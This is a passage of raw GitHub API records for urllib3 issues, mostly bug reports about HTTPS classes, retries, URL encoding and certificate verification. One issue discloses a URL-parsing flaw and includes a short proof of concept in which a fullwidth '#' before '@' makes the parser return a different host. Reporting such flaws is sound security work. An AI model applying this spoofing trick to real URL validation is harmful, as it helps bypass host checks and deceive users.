request\r\n    method, url, fields=fields, headers=headers, **urlopen_kw\r\n  File \"/Users/someusername/Library/Python/3.7/lib/python/site-packages/urllib3/request.py\", line 97, in request_encode_url\r\n    return self.urlopen(method, url, **extra_kw)\r\n  File \"/Users/someusername/Library/Python/3.7/lib/python/site-packages/urllib3/poolmanager.py\", line 330, in urlopen\r\n    response = conn.urlopen(method, u.request_uri, **kw)\r\n  File \"/Users/someusername/Library/Python/3.7/lib/python/site-packages/urllib3/connectionpool.py\", line 615, in urlopen\r\n    url = six.ensure_str(_encode_target(url))\r\n  File \"/Users/someusername/Library/Python/3.7/lib/python/site-packages/urllib3/util/url.py\", line 328, in _encode_target\r\n    path, query, fragment = TARGET_RE.match(target).groups()\r\nAttributeError: 'NoneType' object has no attribute 'groups'\r\n```", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1730", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1730/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1730/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1730/events", "html_url": "https://github.com/urllib3/urllib3/issues/1730", "id": 516785430, "node_id": "MDU6SXNzdWU1MTY3ODU0MzA=", "number": 1730, "title": "Rework the HTTPS connection classes", "user": {"login": "pquentin", "id": 42327, "node_id": "MDQ6VXNlcjQyMzI3", "avatar_url": "https://avatars1.githubusercontent.com/u/42327?v=4", "gravatar_id": "", "url": "https://api.github.com/users/pquentin", "html_url": "https://github.com/pquentin", "followers_url": "https://api.github.com/users/pquentin/followers", "following_url": "https://api.github.com/users/pquentin/following{/other_user}", "gists_url": "https://api.github.com/users/pquentin/gists{/gist_id}", "starred_url": "https://api.github.com/users/pquentin/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/pquentin/subscriptions", "organizations_url": "https://api.github.com/users/pquentin/orgs", "repos_url": "https://api.github.com/users/pquentin/repos", "events_url": "https://api.github.com/users/pquentin/events{/privacy}", "received_events_url": "https://api.github.com/users/pquentin/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2019-11-03T05:59:10Z", "updated_at": "2020-02-09T03:30:03Z", "closed_at": "2020-02-09T03:30:03Z", "author_association": "MEMBER", "active_lock_reason": null, "body": "We realized in #1726 that all HTTPS connections go through the VerifiedHTTPSConnection class, even when they're unverified. This means we can merge VerifiedHTTPSConnection into HTTPSConnection.\r\n\r\nHowever, those classes are part of our public API (see https://urllib3.readthedocs.io/en/latest/reference/index.html#module-urllib3.connection). The current layout is:\r\n\r\n * HTTPSConnection is not visible, but is exported as UnverifiedHTTPSConnection\r\n * VerifiedHTTPSConnection is available directly, but is also exported as HTTPSConnection\r\n\r\nTo preserve compatibility, we can expose HTTPSConnection directly, and then also export it as VerifiedHTTPSConnection and UnverifiedHTTPSConnection. This allows us to move to a single class while still exposing the same classes as before.\r\n\r\nIt will actually be an improvement, because HTTPSConnection  exported as UnverifiedHTTPSConnection currently does not work as its connect() method uses variables that don't exist.\r\n\r\nAnother option is to stop exporting aliases, and only expose HTTPSConnection, but this is a breaking change. For example, it's likely to break vcrpy: https://github.com/kevin1024/vcrpy/blob/7caf29735ac6bae9fd17310460a00d66c3eb3a95/vcr/stubs/requests_stubs.py. So let's not do this.\r\n\r\n(It would be interesting to make sure that vcr.py still works after this change.)", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1727", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1727/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1727/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1727/events", "html_url": "https://github.com/urllib3/urllib3/issues/1727", "id": 515418154, "node_id": "MDU6SXNzdWU1MTU0MTgxNTQ=", "number": 1727, "title": "Configure GitHub to require codecov checks", "user": {"login": "pquentin", "id": 42327, "node_id": "MDQ6VXNlcjQyMzI3", "avatar_url": "https://avatars1.githubusercontent.com/u/42327?v=4", "gravatar_id": "", "url": "https://api.github.com/users/pquentin", "html_url": "https://github.com/pquentin", "followers_url": "https://api.github.com/users/pquentin/followers", "following_url": "https://api.github.com/users/pquentin/following{/other_user}", "gists_url": "https://api.github.com/users/pquentin/gists{/gist_id}", "starred_url": "https://api.github.com/users/pquentin/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/pquentin/subscriptions", "organizations_url": "https://api.github.com/users/pquentin/orgs", "repos_url": "https://api.github.com/users/pquentin/repos", "events_url": "https://api.github.com/users/pquentin/events{/privacy}", "received_events_url": "https://api.github.com/users/pquentin/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 6, "created_at": "2019-10-31T13:05:51Z", "updated_at": "2020-04-01T13:23:33Z", "closed_at": "2020-04-01T05:21:48Z", "author_association": "MEMBER", "active_lock_reason": null, "body": "Since the codecov reports are noisy, we frequently merge pull requests that lower coverage or even completely break coverage upload.\r\n\r\nIndeed, we're trained to look at status checks, but not at the coverage report. But codecov is able to report its results with a status check too:\r\n\r\n![Capture d\u2019e\u0301cran 2019-10-31 a\u0300 17 01 46](https://user-images.githubusercontent.com/42327/67948921-23109680-fc00-11e9-9652-53a84fd3da38.png)\r\n\r\nBut how can we enable that? I think the trick is to add a branch protection rule in Settings > Branches > Add rule and require the travis and appveyor statuses.\r\n\r\nHere's an example from pquentin/urllib3:\r\n\r\n![Capture d\u2019e\u0301cran 2019-10-31 a\u0300 16 55 56](https://user-images.githubusercontent.com/42327/67948521-5141a680-fbff-11e9-9b17-ee5cec4ed632.png)\r\n\r\nFor python-trio/trio and python-trio/urllib3, it looks like setting this was enough to see codecov checks. We can try to enforce the codecov checks too, and decide to sometimes ignore them when merging. Trio does not do that because they're actually quite noisy.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1714", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1714/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1714/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1714/events", "html_url": "https://github.com/urllib3/urllib3/issues/1714", "id": 513340734, "node_id": "MDU6SXNzdWU1MTMzNDA3MzQ=", "number": 1714, "title": "Retries during chunked transfers fail due to loss of chunked flag", "user": {"login": "lmvlmv", "id": 15229879, "node_id": "MDQ6VXNlcjE1MjI5ODc5", "avatar_url": "https://avatars3.githubusercontent.com/u/15229879?v=4", "gravatar_id": "", "url": "https://api.github.com/users/lmvlmv", "html_url": "https://github.com/lmvlmv", "followers_url": "https://api.github.com/users/lmvlmv/followers", "following_url": "https://api.github.com/users/lmvlmv/following{/other_user}", "gists_url": "https://api.github.com/users/lmvlmv/gists{/gist_id}", "starred_url": "https://api.github.com/users/lmvlmv/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/lmvlmv/subscriptions", "organizations_url": "https://api.github.com/users/lmvlmv/orgs", "repos_url": "https://api.github.com/users/lmvlmv/repos", "events_url": "https://api.github.com/users/lmvlmv/events{/privacy}", "received_events_url": "https://api.github.com/users/lmvlmv/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2019-10-28T14:29:32Z", "updated_at": "2019-10-29T12:58:30Z", "closed_at": "2019-10-29T12:58:30Z", "author_association": "CONTRIBUTOR", "active_lock_reason": null, "body": "Possibly related to [https://github.com/urllib3/urllib3/issues/1352](https://github.com/urllib3/urllib3/issues/1352)\r\n\r\nUsing urllib via requests but this doesn't seem to be the cause. [Recently, in requests](https://github.com/psf/requests/pull/5128), a fix was implemented to use the innate chunking capability in urllib. \r\n\r\nIf a custom Retry class is implemented, a chunked transfer is taking place and a retry-able condition occurs during the transfer the chunked flag is dropped when urlopen() is re-called during the retry.\r\n\r\nIn this case a generator was passed as the data argument and results in the non-chunking version of the code attempting to read it like raw data: TypeError: 'generator' object has no attribute 'len'\r\n\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1710", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1710/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1710/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1710/events", "html_url": "https://github.com/urllib3/urllib3/issues/1710", "id": 512889084, "node_id": "MDU6SXNzdWU1MTI4ODkwODQ=", "number": 1710, "title": "Vertificate Verify failed when disabling verification. 1.25.6.", "user": {"login": "AyJayHam", "id": 41308456, "node_id": "MDQ6VXNlcjQxMzA4NDU2", "avatar_url": "https://avatars1.githubusercontent.com/u/41308456?v=4", "gravatar_id": "", "url": "https://api.github.com/users/AyJayHam", "html_url": "https://github.com/AyJayHam", "followers_url": "https://api.github.com/users/AyJayHam/followers", "following_url": "https://api.github.com/users/AyJayHam/following{/other_user}", "gists_url": "https://api.github.com/users/AyJayHam/gists{/gist_id}", "starred_url": "https://api.github.com/users/AyJayHam/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/AyJayHam/subscriptions", "organizations_url": "https://api.github.com/users/AyJayHam/orgs", "repos_url": "https://api.github.com/users/AyJayHam/repos", "events_url": "https://api.github.com/users/AyJayHam/events{/privacy}", "received_events_url": "https://api.github.com/users/AyJayHam/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2019-10-26T21:42:14Z", "updated_at": "2020-03-16T01:51:55Z", "closed_at": "2020-03-16T01:51:54Z", "author_association": "NONE", "active_lock_reason": null, "body": "Hi! I'm using requests 2.22.0 and urllib3 1.25.6 on Ubuntu with Python Version 3.7.3.\r\n\r\nI think this issue basicly is the same issue as in #1682 . Only diffrence is that im using \r\nverify = False in requests to perform one. Executing it on the ubuntu system causes an Certificate Verify Failed error. \r\n\r\nIf i run it on my local desktop pc which is running Windows i can execute the code with out any issues.\r\n\r\nIm not even quite if this is the right place to ask but maybe you can help me out.\r\n\r\nEdit:\r\nForgot to mention; it works on <1.25.4.\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1709", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1709/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1709/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1709/events", "html_url": "https://github.com/urllib3/urllib3/issues/1709", "id": 512020341, "node_id": "MDU6SXNzdWU1MTIwMjAzNDE=", "number": 1709, "title": "thon3", "user": {"login": "DivyamanasaPasumarthy", "id": 26092506, "node_id": "MDQ6VXNlcjI2MDkyNTA2", "avatar_url": "https://avatars1.githubusercontent.com/u/26092506?v=4", "gravatar_id": "", "url": "https://api.github.com/users/DivyamanasaPasumarthy", "html_url": "https://github.com/DivyamanasaPasumarthy", "followers_url": "https://api.github.com/users/DivyamanasaPasumarthy/followers", "following_url": "https://api.github.com/users/DivyamanasaPasumarthy/following{/other_user}", "gists_url": "https://api.github.com/users/DivyamanasaPasumarthy/gists{/gist_id}", "starred_url": "https://api.github.com/users/DivyamanasaPasumarthy/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/DivyamanasaPasumarthy/subscriptions", "organizations_url": "https://api.github.com/users/DivyamanasaPasumarthy/orgs", "repos_url": "https://api.github.com/users/DivyamanasaPasumarthy/repos", "events_url": "https://api.github.com/users/DivyamanasaPasumarthy/events{/privacy}", "received_events_url": "https://api.github.com/users/DivyamanasaPasumarthy/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 0, "created_at": "2019-10-24T15:28:39Z", "updated_at": "2019-10-24T15:40:27Z", "closed_at": "2019-10-24T15:40:27Z", "author_association": "NONE", "active_lock_reason": null, "body": "", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1708", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1708/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1708/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1708/events", "html_url": "https://github.com/urllib3/urllib3/issues/1708", "id": 511404970, "node_id": "MDU6SXNzdWU1MTE0MDQ5NzA=", "number": 1708, "title": "Urllib3 hangs on some urls", "user": {"login": "Yomguithereal", "id": 2571951, "node_id": "MDQ6VXNlcjI1NzE5NTE=", "avatar_url": "https://avatars1.githubusercontent.com/u/2571951?v=4", "gravatar_id": "", "url": "https://api.github.com/users/Yomguithereal", "html_url": "https://github.com/Yomguithereal", "followers_url": "https://api.github.com/users/Yomguithereal/followers", "following_url": "https://api.github.com/users/Yomguithereal/following{/other_user}", "gists_url": "https://api.github.com/users/Yomguithereal/gists{/gist_id}", "starred_url": "https://api.github.com/users/Yomguithereal/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/Yomguithereal/subscriptions", "organizations_url": "https://api.github.com/users/Yomguithereal/orgs", "repos_url": "https://api.github.com/users/Yomguithereal/repos", "events_url": "https://api.github.com/users/Yomguithereal/events{/privacy}", "received_events_url": "https://api.github.com/users/Yomguithereal/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 5, "created_at": "2019-10-23T15:29:59Z", "updated_at": "2020-03-23T14:32:49Z", "closed_at": "2020-03-23T14:32:49Z", "author_association": "NONE", "active_lock_reason": null, "body": "Hello @urllib3 team, thanks for your work.\r\n\r\nI am having trouble with urls from the [Miami Herald](https://www.miamiherald.com) that completely hangs my scripts. I am using urllib3 v1.25.6\r\n\r\nHere is how to reproduce the issue:\r\n\r\n```python\r\nimport urllib3\r\nimport certifi\r\n\r\nhttp = urllib3.PoolManager(cert_reqs='CERT_REQUIRED', ca_certs=certifi.where())\r\nhttp.request('GET', 'https://www.miamiherald.com/news/local/article220097825.html') \r\n```\r\n\r\n~~This will never end. If you add a timeout, it will work but sometimes (I am currently trying to pinpoint what triggers this), it will ignore the timeout and hangs forever. It smells like threading race conditions and/or deadlock.~~\r\n\r\nSome notes:\r\n\r\n1. `urllib.request.urlopen` does not succeed either\r\n2. Web browsers or CURL succeed in retrieving this url just fine\r\n3. Is this somehow linked to the fact that the site attempts to use HTTP/2.0?\r\n4. CURL will get a 403 if you don't spoof your UA but I don't think this is relevant to this issue\r\n\r\nHave a good day and tell me how I can help.\r\n\r\nEDIT: the timeout not being taken into account is my fault. I found where I messed up.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1707", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1707/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1707/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1707/events", "html_url": "https://github.com/urllib3/urllib3/issues/1707", "id": 511301989, "node_id": "MDU6SXNzdWU1MTEzMDE5ODk=", "number": 1707, "title": "regression in urllib3 > 1.22 parsing bracketed IPvX URLs", "user": {"login": "muelli", "id": 322807, "node_id": "MDQ6VXNlcjMyMjgwNw==", "avatar_url": "https://avatars0.githubusercontent.com/u/322807?v=4", "gravatar_id": "", "url": "https://api.github.com/users/muelli", "html_url": "https://github.com/muelli", "followers_url": "https://api.github.com/users/muelli/followers", "following_url": "https://api.github.com/users/muelli/following{/other_user}", "gists_url": "https://api.github.com/users/muelli/gists{/gist_id}", "starred_url": "https://api.github.com/users/muelli/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/muelli/subscriptions", "organizations_url": "https://api.github.com/users/muelli/orgs", "repos_url": "https://api.github.com/users/muelli/repos", "events_url": "https://api.github.com/users/muelli/events{/privacy}", "received_events_url": "https://api.github.com/users/muelli/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2019-10-23T12:51:30Z", "updated_at": "2019-12-19T22:11:49Z", "closed_at": "2019-10-23T15:06:35Z", "author_association": "NONE", "active_lock_reason": null, "body": "With urllib-1.22 I was able to do:\r\n```\r\nurllib3.util.parse_url(\"http://[[127.1]]\")\r\n```\r\n\r\nWith 1.24 that results in an exception:\r\n```\r\n/tmp/gks3/lib/python3.6/site-packages/urllib3/util/url.py in parse_url(url)\r\n    399 \r\n    400     except (ValueError, AttributeError):\r\n--> 401         return six.raise_from(LocationParseError(source_url), None)\r\n    402 \r\n    403     # For the sake of backwards compatibility we put empty\r\n\r\n/tmp/gks3/lib/python3.6/site-packages/urllib3/packages/six.py in raise_from(value, from_value)\r\n\r\nLocationParseError: Failed to parse: http://[[127.1]]\r\n```\r\n\r\nIn my usecase, I receive an IP address and I have happily added brackets to make it work with both IPv4 and IPv6 addresses. Relying on that behaviour may have been too na\u00efve, but anyway, that behaviour is broken now.\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1706", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1706/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1706/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1706/events", "html_url": "https://github.com/urllib3/urllib3/issues/1706", "id": 505855584, "node_id": "MDU6SXNzdWU1MDU4NTU1ODQ=", "number": 1706, "title": "Unify timeout values used in tests", "user": {"login": "pquentin", "id": 42327, "node_id": "MDQ6VXNlcjQyMzI3", "avatar_url": "https://avatars1.githubusercontent.com/u/42327?v=4", "gravatar_id": "", "url": "https://api.github.com/users/pquentin", "html_url": "https://github.com/pquentin", "followers_url": "https://api.github.com/users/pquentin/followers", "following_url": "https://api.github.com/users/pquentin/following{/other_user}", "gists_url": "https://api.github.com/users/pquentin/gists{/gist_id}", "starred_url": "https://api.github.com/users/pquentin/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/pquentin/subscriptions", "organizations_url": "https://api.github.com/users/pquentin/orgs", "repos_url": "https://api.github.com/users/pquentin/repos", "events_url": "https://api.github.com/users/pquentin/events{/privacy}", "received_events_url": "https://api.github.com/users/pquentin/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2019-10-11T13:32:34Z", "updated_at": "2019-10-31T14:20:14Z", "closed_at": "2019-10-31T14:20:14Z", "author_association": "MEMBER", "active_lock_reason": null, "body": "We have lots of tests that use timeout values, eg. to check that a given operation timeouts as expected or completes a given amount of work before a certain amount of time. Unfortunately, in CI those tests tend to fail some of the time, because say 1% of the time everything is super slow.\r\n\r\nIn response to this, we went from 0.001 to 0.01 and sometimes 0.1 in the places that failed the most often (#1554 and #1496 are recent examples). But there are still some tests that fail because they were not updated. Since there is no test that is inherently slow in the test suite that I'm aware of, I think it would be nice to share a few timeout values (ideally two) in all tests, so that we can:\r\n\r\n 1. bump them all at once if needed\r\n 2. use smaller values in local environments, and larger values in CI", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1695", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1695/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1695/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1695/events", "html_url": "https://github.com/urllib3/urllib3/issues/1695", "id": 498177520, "node_id": "MDU6SXNzdWU0OTgxNzc1MjA=", "number": 1695, "title": " Url.parse_url - Improper handling of unicode Encoding during NFKC normalization", "user": {"login": "cpamirla", "id": 16644198, "node_id": "MDQ6VXNlcjE2NjQ0MTk4", "avatar_url": "https://avatars0.githubusercontent.com/u/16644198?v=4", "gravatar_id": "", "url": "https://api.github.com/users/cpamirla", "html_url": "https://github.com/cpamirla", "followers_url": "https://api.github.com/users/cpamirla/followers", "following_url": "https://api.github.com/users/cpamirla/following{/other_user}", "gists_url": "https://api.github.com/users/cpamirla/gists{/gist_id}", "starred_url": "https://api.github.com/users/cpamirla/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/cpamirla/subscriptions", "organizations_url": "https://api.github.com/users/cpamirla/orgs", "repos_url": "https://api.github.com/users/cpamirla/repos", "events_url": "https://api.github.com/users/cpamirla/events{/privacy}", "received_events_url": "https://api.github.com/users/cpamirla/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 4, "created_at": "2019-09-25T09:54:39Z", "updated_at": "2019-10-18T22:56:42Z", "closed_at": "2019-10-18T22:56:42Z", "author_association": "NONE", "active_lock_reason": null, "body": "Improper handling of unicode Encoding during NFKC normalization appears in Url.parse_url of urllib3.\r\nThis bug enables an attacker to inject specific unicode characters inside of an URL and be able to manipulate the netloc attribute of Url object.\r\n\r\nPOC:\r\n>> from urllib3.util.url import parse_url\r\n>> u = \"https://example1.com\\uFF03@example2.org\"\r\n\r\n>> parse_url(u).netloc\r\n'example2.org'\r\n\r\n>> u = \"https://example1.com\\uFF03@example2.org\".encode(\"idna\").decode(\"ascii\")\r\n>> parse_url(u).netloc\r\n'example1.com'\r\n\r\n\r\nReference\r\nhttps://bugs.python.org/issue36216\r\n\r\nCredit to: Yohann Sillam", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1683", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1683/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1683/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1683/events", "html_url": "https://github.com/urllib3/urllib3/issues/1683", "id": 496055450, "node_id": "MDU6SXNzdWU0OTYwNTU0NTA=", "number": 1683, "title": "Tilde characters encoded in URLs starting in 1.25.4", "user": {"login": "jeblair", "id": 899068, "node_id": "MDQ6VXNlcjg5OTA2OA==", "avatar_url": "https://avatars3.githubusercontent.com/u/899068?v=4", "gravatar_id": "", "url": "https://api.github.com/users/jeblair", "html_url": "https://github.com/jeblair", "followers_url": "https://api.github.com/users/jeblair/followers", "following_url": "https://api.github.com/users/jeblair/following{/other_user}", "gists_url": "https://api.github.com/users/jeblair/gists{/gist_id}", "starred_url": "https://api.github.com/users/jeblair/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/jeblair/subscriptions", "organizations_url": "https://api.github.com/users/jeblair/orgs", "repos_url": "https://api.github.com/users/jeblair/repos", "events_url": "https://api.github.com/users/jeblair/events{/privacy}", "received_events_url": "https://api.github.com/users/jeblair/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": {"login": "sethmlarson", "id": 18519037, "node_id": "MDQ6VXNlcjE4NTE5MDM3", "avatar_url": "https://avatars0.githubusercontent.com/u/18519037?v=4", "gravatar_id": "", "url": "https://api.github.com/users/sethmlarson", "html_url": "https://github.com/sethmlarson", "followers_url": "https://api.github.com/users/sethmlarson/followers", "following_url": "https://api.github.com/users/sethmlarson/following{/other_user}", "gists_url": "https://api.github.com/users/sethmlarson/gists{/gist_id}", "starred_url": "https://api.github.com/users/sethmlarson/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/sethmlarson/subscriptions", "organizations_url": "https://api.github.com/users/sethmlarson/orgs", "repos_url": "https://api.github.com/users/sethmlarson/repos", "events_url": "https://api.github.com/users/sethmlarson/events{/privacy}", "received_events_url": "https://api.github.com/users/sethmlarson/received_events", "type": "User", "site_admin": false}, "assignees": [{"login": "sethmlarson", "id": 18519037, "node_id": "MDQ6VXNlcjE4NTE5MDM3", "avatar_url": "https://avatars0.githubusercontent.com/u/18519037?v=4", "gravatar_id": "", "url": "https://api.github.com/users/sethmlarson", "html_url": "https://github.com/sethmlarson", "followers_url": "https://api.github.com/users/sethmlarson/followers", "following_url": "https://api.github.com/users/sethmlarson/following{/other_user}", "gists_url": "https://api.github.com/users/sethmlarson/gists{/gist_id}", "starred_url": "https://api.github.com/users/sethmlarson/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/sethmlarson/subscriptions", "organizations_url": "https://api.github.com/users/sethmlarson/orgs", "repos_url": "https://api.github.com/users/sethmlarson/repos", "events_url": "https://api.github.com/users/sethmlarson/events{/privacy}", "received_events_url": "https://api.github.com/users/sethmlarson/received_events", "type": "User", "site_admin": false}], "milestone": null, "comments": 4, "created_at": "2019-09-19T22:28:12Z", "updated_at": "2019-09-24T14:35:16Z", "closed_at": "2019-09-24T13:50:53Z", "author_association": "NONE", "active_lock_reason": null, "body": "Release 1.25.4 has a behavior change due to #1673 -- tilde characters in URLs are now percent-encoded.  Some remote systems may not decode path components if they are not expecting any input other than unreserved characters.  In such cases, this behavior change may cause user-visible errors.\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1682", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1682/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1682/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1682/events", "html_url": "https://github.com/urllib3/urllib3/issues/1682", "id": 495899051, "node_id": "MDU6SXNzdWU0OTU4OTkwNTE=", "number": 1682, "title": "SSL verification issue with 1.25.4 (via requests)", "user": {"login": "sbstp", "id": 862368, "node_id": "MDQ6VXNlcjg2MjM2OA==", "avatar_url": "https://avatars1.githubusercontent.com/u/862368?v=4", "gravatar_id": "", "url": "https://api.github.com/users/sbstp", "html_url": "https://github.com/sbstp", "followers_url": "https://api.github.com/users/sbstp/followers", "following_url": "https://api.github.com/users/sbstp/following{/other_user}", "gists_url": "https://api.github.com/users/sbstp/gists{/gist_id}", "starred_url": "https://api.github.com/users/sbstp/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/sbstp/subscriptions", "organizations_url": "https://api.github.com/users/sbstp/orgs", "repos_url": "https://api.github.com/users/sbstp/repos", "events_url": "https://api.github.com/users/sbstp/events{/privacy}", "received_events_url": "https://api.github.com/users/sbstp/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 25, "created_at": "2019-09-19T16:15:03Z", "updated_at": "2020-08-06T09:58:53Z", "closed_at": "2019-09-20T01:31:52Z", "author_association": "NONE", "active_lock_reason": null, "body": "Hi! I'm using `requests` 2.22.0 and `urllib3` 1.25.4.\r\n\r\nIn requests, I need to disable certificate verification because we use self signed certificates. I create a `Session` object and set its `verify` property to `False`, which used to worked perfectly fine until `urllib3` 1.25.4.\r\n\r\nThis is the stacktrace\r\n```\r\nvenv/lib/python3.6/site-packages/urllib3-1.25.4-py3.6.egg/urllib3/connectionpool.py:672: in urlopen\r\n    chunked=chunked,\r\nvenv/lib/python3.6/site-packages/urllib3-1.25.4-py3.6.egg/urllib3/connectionpool.py:376: in _make_request\r\n    self._validate_conn(conn)\r\nvenv/lib/python3.6/site-packages/urllib3-1.25.4-py3.6.egg/urllib3/connectionpool.py:994: in _validate_conn\r\n    conn.connect()\r\nvenv/lib/python3.6/site-packages/urllib3-1.25.4-py3.6.egg/urllib3/connection.py:394: in connect\r\n    ssl_context=context,\r\nvenv/lib/python3.6/site-packages/urllib3-1.25.4-py3.6.egg/urllib3/util/ssl_.py:365: in ssl_wrap_socket\r\n    return context.wrap_socket(sock, server_hostname=server_hostname)\r\n/usr/lib/python3.6/ssl.py:407: in wrap_socket\r\n    _context=self, _session=session)\r\n/usr/lib/python3.6/ssl.py:817: in __init__\r\n    self.do_handshake()\r\n/usr/lib/python3.6/ssl.py:1077: in do_handshake\r\n    self._sslobj.do_handshake()\r\n/usr/lib/python3.6/ssl.py:689: in do_handshake\r\n    self._sslobj.do_handshake()\r\nE   ssl.SSLError: [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:852)\r\n\r\nDuring handling of the above exception, another exception occurred:\r\nvenv/lib/python3.6/site-packages/requests-2.22.0-py3.6.egg/requests/adapters.py:449: in send\r\n    timeout=timeout\r\nvenv/lib/python3.6/site-packages/urllib3-1.25.4-py3.6.egg/urllib3/connectionpool.py:720: in urlopen\r\n    method, url, error=e, _pool=self, _stacktrace=sys.exc_info()[2]\r\nvenv/lib/python3.6/site-packages/urllib3-1.25.4-py3.6.egg/urllib3/util/retry.py:436: in increment\r\n    raise MaxRetryError(_pool, url, error or ResponseError(cause))\r\nE   urllib3.exceptions.MaxRetryError: HTTPSConnectionPool(host='udb-config-dev.ubisoft.org', port=443): Max retries exceeded with url: /v1/config/users?name=backend_test_tool (Caused by SSLError(SSLError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:852)'),))\r\n```\r\n\r\nI tried installing `urllib3` 1.25.3 and there is no issue. It seems like the SSL error was introduced in 1.25.4.\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1680", "repository_url": 